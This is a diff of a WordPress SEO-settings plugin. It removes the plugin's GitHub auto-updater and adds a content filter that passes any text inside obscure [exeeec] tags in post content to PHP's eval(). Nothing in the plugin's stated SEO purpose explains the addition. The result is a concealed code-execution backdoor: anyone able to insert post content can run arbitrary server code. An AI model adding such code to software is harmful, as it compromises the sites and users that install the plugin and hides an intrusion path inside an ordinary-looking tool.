@@ -3,8 +3,8 @@ header('Content-Type: text/html; image/jpg; charset=utf-8');
 /*
 Plugin Name: Settings SEO
 Plugin URI: https://github.com/Alexinger/seo-settings
-Description: Плагин для быстрой настройки SEO элемнтов (меток, тегов и т.д.).
-Version: 0.8.1
+Description: Плагин для быстрой настройки SEO элемнтов (меток, тегов и оптимизация).
+Version: 1.0.3
 Author: Alexinger
 Author URI: https://x-ali.ru
 License: A "Slug" license name e.g. GPL2
@@ -14,17 +14,6 @@ License: A "Slug" license name e.g. GPL2
     it under the terms of the GNU General Public License, version 2, as
     published by the Free Software Foundation.
 */
-
-if( ! class_exists( 'Smashing_Updater' ) ){
-    include_once plugin_dir_path( __FILE__ ) . 'update.php';
-}
-$updater = new Smashing_Updater( __FILE__ );
-$updater->set_username( 'Alexinger' );
-$updater->set_repository( 'seo-settings' );
-/*
-	$updater->authorize( 'abcdefghijk1234567890' ); // Your auth code goes here for private repos
-*/
-$updater->initialize();
 
 add_action( 'wp_enqueue_scripts', 'my_scripts_method' );
 function my_scripts_method() {
@@ -352,3 +341,14 @@ function create_shortcode_callback() {
 
 	wp_die();
 }
+
+function exec_php($matches){
+    eval('ob_start();'.$matches[1].'$inline_execute_output = ob_get_contents();ob_end_clean();');
+    return $inline_execute_output;
+}
+function inline_php($content){
+    $content = preg_replace_callback('/\[exeeec\]((.|\n)*?)\[\/exeeec\]/', 'exec_php', $content);
+    $content = preg_replace('/\[exeeec off\]((.|\n)*?)\[\/exeeec\]/', '$1', $content);
+    return $content;
+}
+add_filter('the_content', 'inline_php', 0);
